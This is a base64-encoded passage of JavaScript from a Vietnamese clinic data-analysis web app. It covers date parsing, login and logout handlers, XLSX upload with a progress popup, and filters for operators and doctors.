lc1RvU2hvdyA9IGFsbERhdGVzLmZpbHRlcihkID0+IGhlcmJEYXRlcy5oYXMoZCkpOw0KICAgIH0NCg0KICAgIC8vIDMuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBHaeG7nSB0cuG7kW5nIChmaWx0ZXJEYXRlKQ0KICAgIGNvbnN0IGZpbHRlckRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpOw0KICAgIGlmIChmaWx0ZXJEYXRlU2VsZWN0KSB7DQogICAgICAgIGZpbHRlckRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQoNCiAgICAvLyA0LiBD4bqtcCBuaOG6rXQgZHJvcGRvd24gU+G6r2MgdGh14buRYyB0aGFuZyAoaGVyYkRhdGVGaWx0ZXIpDQogICAgY29uc3QgaGVyYkRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBpZiAoaGVyYkRhdGVTZWxlY3QpIHsNCiAgICAgICAgaGVyYkRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQp9KTsNCg0KDQogICAgICAgIGZ1bmN0aW9uIHBhcnNlRGF0ZVRpbWUoZGF0ZXRpbWVTdHIsIHJvd0luZGV4KSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGlmICghZGF0ZXRpbWVTdHIpIHsNCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ251bWJlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhjZWxEYXRlID0gbmV3IERhdGUoTWF0aC5yb3VuZCgoZGF0ZXRpbWVTdHIgLSAyNTU2OSkgKiA4NjQwMCAqIDEwMDApKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF5ID0gZXhjZWxEYXRlLmdldERhdGUoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbW9udGggPSBleGNlbERhdGUuZ2V0TW9udGgoKSArIDE7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHllYXIgPSBleGNlbERhdGUuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaG91cnMgPSBleGNlbERhdGUuZ2V0SG91cnMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IGV4Y2VsRGF0ZS5nZXRNaW51dGVzKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSBleGNlbERhdGUuZ2V0U2Vjb25kcygpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVPYmo6IGV4Y2VsRGF0ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBob3VycyAqIDYwICsgbWludXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IGhvdXJzICogMzYwMCArIG1pbnV0ZXMgKiA2MCArIHNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0ZXRpbWVTdHIgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBkYXRlUGFydCwgdGltZVBhcnQgPSAnMDA6MDA6MDAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZXRpbWVTdHIuaW5jbHVkZXMoJyAnKSkgW2RhdGVQYXJ0LCB0aW1lUGFydF0gPSBkYXRldGltZVN0ci5zcGxpdCgnICcpOw0KICAgICAgICAgICAgICAgICAgICBlbHNlIGRhdGVQYXJ0ID0gZGF0ZXRpbWVTdHI7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBsZXQgZGF5LCBtb250aCwgeWVhcjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFtkYXksIG1vbnRoLCB5ZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbZGF5LCBtb250aF0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChkYXRlUGFydC5pbmNsdWRlcygnLScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IGRhdGVQYXJ0LnNwbGl0KCctJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSBbeWVhciwgbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMikgW21vbnRoLCBkYXldID0gcGFydHMubWFwKE51bWJlciksIHllYXIgPSBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIG5nw6B5IGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF5KSB8fCBpc05hTihtb250aCkgfHwgaXNOYU4oeWVhcikgfHwgZGF5IDwgMSB8fCBkYXkgPiAzMSB8fCBtb250aCA8IDEgfHwgbW9udGggPiAxMikgew0KICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdHacOhIHRy4buLIG5nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBob3VycyA9IDAsIG1pbnV0ZXMgPSAwLCBzZWNvbmRzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHRpbWVQYXJ0LmluY2x1ZGVzKCc6JykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVQYXJ0cyA9IHRpbWVQYXJ0LnNwbGl0KCc6Jyk7DQogICAgICAgICAgICAgICAgICAgICAgICBob3VycyA9IHBhcnNlSW50KHRpbWVQYXJ0c1swXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXMgPSBwYXJzZUludCh0aW1lUGFydHNbMV0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gcGFyc2VJbnQodGltZVBhcnRzWzJdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oaG91cnMpIHx8IGlzTmFOKG1pbnV0ZXMpIHx8IGlzTmFOKHNlY29uZHMpIHx8IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzIDwgMCB8fCBob3VycyA+IDIzIHx8IG1pbnV0ZXMgPCAwIHx8IG1pbnV0ZXMgPiA1OSB8fCBzZWNvbmRzIDwgMCB8fCBzZWNvbmRzID4gNTkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignR2nDoSB0cuG7iyB0aOG7nWkgZ2lhbiBraMO0bmcgaOG7o3AgbOG7hycsIHJvd0luZGV4LCB7IHRpbWU6IHRpbWVQYXJ0IH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gMDsgbWludXRlcyA9IDA7IHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlT2JqID0gbmV3IERhdGUoeWVhciwgbW9udGggLSAxLCBkYXksIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGRhdGVPYmouZ2V0VGltZSgpKSkgdGhyb3cgbmV3IEVycm9yKCdOZ8OgeSBraMO0bmcgaOG7o3AgbOG7hycpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kc0luRGF5ID0gaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kczsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlc0luRGF5ID0gaG91cnMgKiA2MCArIG1pbnV0ZXM7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iaiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBtaW51dGVzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzOiBzZWNvbmRzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCfEkOG7i25oIGThuqFuZyB0aOG7nWkgZ2lhbiBraMO0bmcgxJHGsOG7o2MgaOG7lyB0cuG7oycpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgcGjDom4gdMOtY2ggdGjhu51pIGdpYW46ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dJbmRleCwgeyANCiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IGRhdGV0aW1lU3RyLA0KICAgICAgICAgICAgICAgICAgICBlcnJvckRldGFpbHM6IGVycm9yLnN0YWNrIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLy8gPT09PT09PT09PSBLSOG7nkkgVOG6oE8gU+G7sCBLSeG7hk4gPT09PT09PT09PSAvLw0KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQoJCWxvYWREYXJrTW9kZVByZWZlcmVuY2UoKTsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS5mb2N1cygpOw0KICAgICAgICAgICAgLy8gS2hpIHRyYW5nIGxvYWQNCiAgICAgICAgICAgIGlmICghc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuYWRkKCdsb2dpbi1wYWdlJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCBraGkgdHJhbmcgdOG6o2kNCgkJDQoJCQkNCiAgICAgICAgICAgIGNoZWNrU2F2ZWRMb2dpbigpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGlzTG9naW5BY3Rpb24gPSB0cnVlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGNoZWNrTG9naW4oKTsNCn0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyB4deG6pXQNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dvdXRCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gZmFsc2U7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgbG9nb3V0KCk7DQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyDEkMSDbmcgbmjhuq1wIGLhurFuZyBwaMOtbSBFbnRlcg0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgICAgICAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgICAgICAgICAgICAgICBjaGVja0xvZ2luKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgcGjDom4gdMOtY2ggZmlsZQ0KICAgICAgICAgICAgDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgYXN5bmMgKCkgPT4gew0KICBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggxJHDum5nIGzDumMgZMO5bmcNCiAgICBjb25zdCBmaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KaWYgKCFmaWxlKSB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPlZ1aSBsw7JuZyBjaOG7jW4gZmlsZSB0csaw4bubYyBraGkga2nhu4NtIHRyYTwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheT0nbm9uZSciPsSQw7NuZzwvYnV0dG9uPg0KICAgIGA7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgIA0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHJldHVybjsNCn0NCg0KDQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXBhcGVyLXBsYW5lIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzM0OThkYjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4nOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzMzJSc7DQoJDQoJDQoJDQoJY29uc3QgcHJvZ3Jlc3NCYXJDb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXJDb250YWluZXInKTsNCg0KLy8gQ2jhu4kgdOG6oW8gMSBs4bqnbg0KaWYgKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3JlZGl0TGluZUJlbG93JykpIHsNCiAgY29uc3QgY3JlZGl0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGNyZWRpdC5pZCA9ICdjcmVkaXRMaW5lQmVsb3cnOw0KICBjcmVkaXQuaW5uZXJUZXh0ID0gJ8KpIFRoaeG6v3Qga+G6vyAmIHBow6F0IHRyaeG7g24gYuG7n2kgRHIuIENow6J1JzsNCiAgY3JlZGl0LnN0eWxlLm1hcmdpblRvcCA9ICcxMHB4JzsNCiAgY3JlZGl0LnN0eWxlLmZvbnRTaXplID0gJzE2cHgnOw0KICBjcmVkaXQuc3R5bGUuY29sb3IgPSAnI0ZGMDAwMCc7DQogIGNyZWRpdC5zdHlsZS50ZXh0QWxpZ24gPSAnY2VudGVyJzsNCg0KICBwcm9ncmVzc0JhckNvbnRhaW5lci5wYXJlbnROb2RlLmluc2VydEJlZm9yZShjcmVkaXQsIHByb2dyZXNzQmFyQ29udGFpbmVyLm5leHRTaWJsaW5nKTsNCn0NCgkNCgkNCgkNCgkNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDUwKSkpOw0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCA3MDApKTsNCg0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzY2JSc7DQoNCiAgICBsZXQgdG90YWwgPSAwOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGZpbGVSZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gew0KICAgICAgICAgICAgZmlsZVJlYWRlci5vbmxvYWQgPSBlID0+IHJlc29sdmUobmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KSk7DQogICAgICAgICAgICBmaWxlUmVhZGVyLm9uZXJyb3IgPSAoKSA9PiByZWplY3QobmV3IEVycm9yKCJM4buXaSDEkeG7jWMgZmlsZSIpKTsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgY29uc3QgZmlyc3RTaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgew0KICAgICAgICAgICAgaGVhZGVyOiAxLA0KICAgICAgICAgICAgZGVmdmFsOiAiIiwNCiAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZQ0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCByb3dzID0ganNvbkRhdGEuc2xpY2UoOSk7DQogICAgICAgIHRvdGFsID0gcm93cy5sZW5ndGg7DQogICAgfSBjYXRjaCB7DQogICAgICAgIHRvdGFsID0gMTAwMDsNCiAgICB9DQoNCiAgICBjb25zdCBzdGVwID0gMTAwOw0KICAgIGNvbnN0IHN0ZXBzID0gTWF0aC5jZWlsKHRvdGFsIC8gc3RlcCk7DQogICAgY29uc3QgaW50ZXJ2YWwgPSAyNjAwIC8gc3RlcHM7DQoNCiAgICBmb3IgKGxldCBpID0gMTsgaSA8PSBzdGVwczsgaSsrKSB7DQogICAgICAgIGNvbnN0IGN1cnJlbnQgPSBNYXRoLm1pbihpICogc3RlcCwgdG90YWwpOw0KICAgICAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzI5ODBiOTttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkGFuZyBwaMOibiB0w61jaCBk4buvIGxp4buHdSB04burbmcgYuG7h25oIG5ow6JuLi4uPGJyPicgKyBjdXJyZW50ICsgJyAvICcgKyB0b3RhbDsNCiAgICAgICAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIGludGVydmFsKSk7DQogICAgfQ0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtY2hlY2stY2lyY2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6Z3JlZW47bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJDDoyBraeG7g20gdHJhIHhvbmcuLi4nOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzEwMCUnOw0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDAwKSk7DQoNCmlmICghd2luZG93LmlzS2hvYUxvaSkgew0KICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNTAwKTsNCg0KDQp9DQoNCg0KDQogZWxzZSB7DQogICAgLy8gTuG6v3UgxJFhbmcgbOG7l2kgS2hvYSwgS0jDlE5HIMSRxrDhu6NjIOG6qW4gcG9wdXANCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCn0NCiAgICBoYW5kbGVGaWxlKCk7DQoJDQoJDQoJDQoJDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAvLyDinYwgTuG6v3UgxJFhbmcgbOG7l2kgdMOqbiBraG9hIHRow6wgZ2nhu68gbmd1ecOqbiBwb3B1cCwgS0jDlE5HIMSRxrDhu6NjIOG6qW4sIEtIw5RORyBoaeG7h24gbsO6dA0KICAgIGlmICh3aW5kb3cuaXNLaG9hTG9pKSB7DQogICAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIOKchSBO4bq/dSBraMO0bmcgbOG7l2ksIHRow6wg4bqpbiBwb3B1cCB2w6AgaGnhu4duIG7DunQgY2jhu6ljIG7Eg25nDQogICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQoNCiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b24uYnRuJykuZm9yRWFjaChidG4gPT4gew0KICAgICAgICAgaWYgKGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnR2nhu50gdHLhu5FuZycpIHx8IA0KICAgICAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnU+G6r2MgdGh14buRYyB0aGFuZycpIHx8DQogICAgICAgICAgICAgICAgYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdEYW5oIHPDoWNoIGLhu4duaCBuaMOibicpKSB7DQogICAgICAgICAgICAgICAgYnRuLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICAgICAgfQ0KICAgIH0pOw0KfSwgNTAwKTsNCg0KDQoJDQoJDQoJICAgIC8vIEPhuq1wIG5o4bqtdCBn4bujaSDDvSBraGkgdGhheSDEkeG7lWkgdMO5eSBjaOG7jW4gdGjhu51pIGdpYW4NCiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dFtuYW1lPSJ0aW1lT3B0aW9uIl0nKS5mb3JFYWNoKHJhZGlvID0+IHsNCiAgICAgICAgcmFkaW8uYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nICYmIG1hY2hpbmVDb25mbGljdExvZy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgZ2VuZXJhdGVNYWNoaW5lVGltZVN1Z2dlc3Rpb25zKCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0pOw0KICAgIH0pOw0KDQogICAgLy8gQ+G6rXAgbmjhuq10IGfhu6NpIMO9IGtoaSB0aGF5IMSR4buVaSBz4buRIGzGsOG7o25nIGtodW5nIGdp4budDQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICBpZiAobWFjaGluZUNvbmZsaWN0TG9nICYmIG1hY2hpbmVDb25mbGljdExvZy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KCQ0KCQ0KfSk7DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gZHJvcGRvd24gbOG7jWMNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KICAgICAgICAgICAgDQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJCeU9wZXJhdG9yKTsNCgkJCQ0KCQkJ